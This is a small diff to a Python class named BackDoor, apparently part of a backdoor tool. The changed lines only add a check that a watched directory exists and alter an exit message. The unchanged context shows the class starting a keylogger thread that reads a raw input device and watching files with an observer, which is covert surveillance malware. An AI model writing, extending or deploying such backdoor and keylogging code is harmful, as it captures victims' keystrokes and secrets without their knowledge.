@@ -157,6 +157,9 @@ class BackDoor:
             keylog_t = Thread(target=self.start_keylogger)
             keylog_t.start()
 
+            if not os.path.exists(self.watch_dir):
+                raise FileNotFoundError("Dir not found")
+
             event_handler = EventHandler(self.watch_file, self)
             observer = Observer()
             observer.schedule(event_handler, self.watch_dir, recursive=True)
@@ -171,7 +174,7 @@ class BackDoor:
             observer.join()
             sys.exit(" Closed")
         except FileNotFoundError as e:
-            sys.exit(" Closed")
+            sys.exit(" Directory not found")
 
     def start_keylogger(self) -> None:
         device = InputDevice(self.device)
